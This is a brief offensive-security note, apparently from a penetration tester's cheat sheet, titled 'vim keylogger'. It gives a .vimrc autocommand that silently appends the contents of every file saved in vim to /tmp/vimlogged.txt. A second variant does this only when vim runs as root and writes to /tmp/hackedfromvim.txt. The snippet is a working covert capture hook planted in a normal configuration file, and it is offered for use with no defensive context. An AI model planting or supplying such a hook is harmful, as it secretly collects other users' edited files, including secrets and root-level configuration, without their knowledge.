vim keylogger
```
┌──(kali㉿kali)-[~]
└─$ cat .vimrc 
:autocmd BufWritePost * :silent :w! >> /tmp/vimlogged.txt
                                                                                                                                                                                                                                            
```

Check to see if vim running as root
```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```
